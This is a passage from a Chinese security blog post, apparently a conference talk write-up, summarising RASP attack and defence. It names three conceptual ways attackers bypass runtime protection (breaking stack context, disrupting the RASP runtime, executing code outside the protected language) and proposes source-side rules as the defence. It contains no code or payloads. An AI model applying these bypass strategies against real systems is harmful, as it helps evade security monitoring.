+<h2 id="RASP攻防的核心思想总结"><a href="#RASP攻防的核心思想总结" class="headerlink" title="RASP攻防的核心思想总结"></a>RASP攻防的核心思想总结</h2><h3 id="未来RASP攻防下的思考-攻击者方向"><a href="#未来RASP攻防下的思考-攻击者方向" class="headerlink" title="未来RASP攻防下的思考-攻击者方向"></a>未来RASP攻防下的思考-攻击者方向</h3><p>对于攻击者，一旦能发现RASP未能覆盖的代码执行权限的漏洞，寻找代码执行和RASP覆盖的恶意行为之间的灰色空间，便是突破RASP防护的主要方向。<br>这个方向又可以拆分成三个重点分支：</p>
+<ol>
+<li>切割堆栈破坏上下文</li>
+<li>破坏RASP运行态</li>
+<li>寻找非RASP语言侧的代码执行</li>
+</ol>
+<h3 id="未来RASP攻防下的思考-RASP方向"><a href="#未来RASP攻防下的思考-RASP方向" class="headerlink" title="未来RASP攻防下的思考-RASP方向"></a>未来RASP攻防下的思考-RASP方向</h3><p>RASP方向上，为了尽可能的去防止攻击者去寻找这片灰色空间，需要将防护的视角不仅仅放在恶意行为的终点侧，也需要在触发漏洞的源头（如表达式、引擎、反序列化）去做相应的规则，不让攻击者去拿到这个代码执行权限。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/byPass/" rel="tag"># byPass</a>
+              <a href="/tags/RASP/" rel="tag"># RASP</a>
+              <a href="/tags/Kcon/" rel="tag"># Kcon</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/04/30/sql_tricks/" rel="prev" title="突破SQL注入语义分析算法的黑魔法">
+                  <i class="fa fa-angle-left"></i> 突破SQL注入语义分析算法的黑魔法
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/01/31/CVE_2024_20931/" rel="next" title="JNDI注入的一种新攻击面-CVE-2024-20931分析">
+                  JNDI注入的一种新攻击面-CVE-2024-20931分析 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Glassy@Amadeus</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
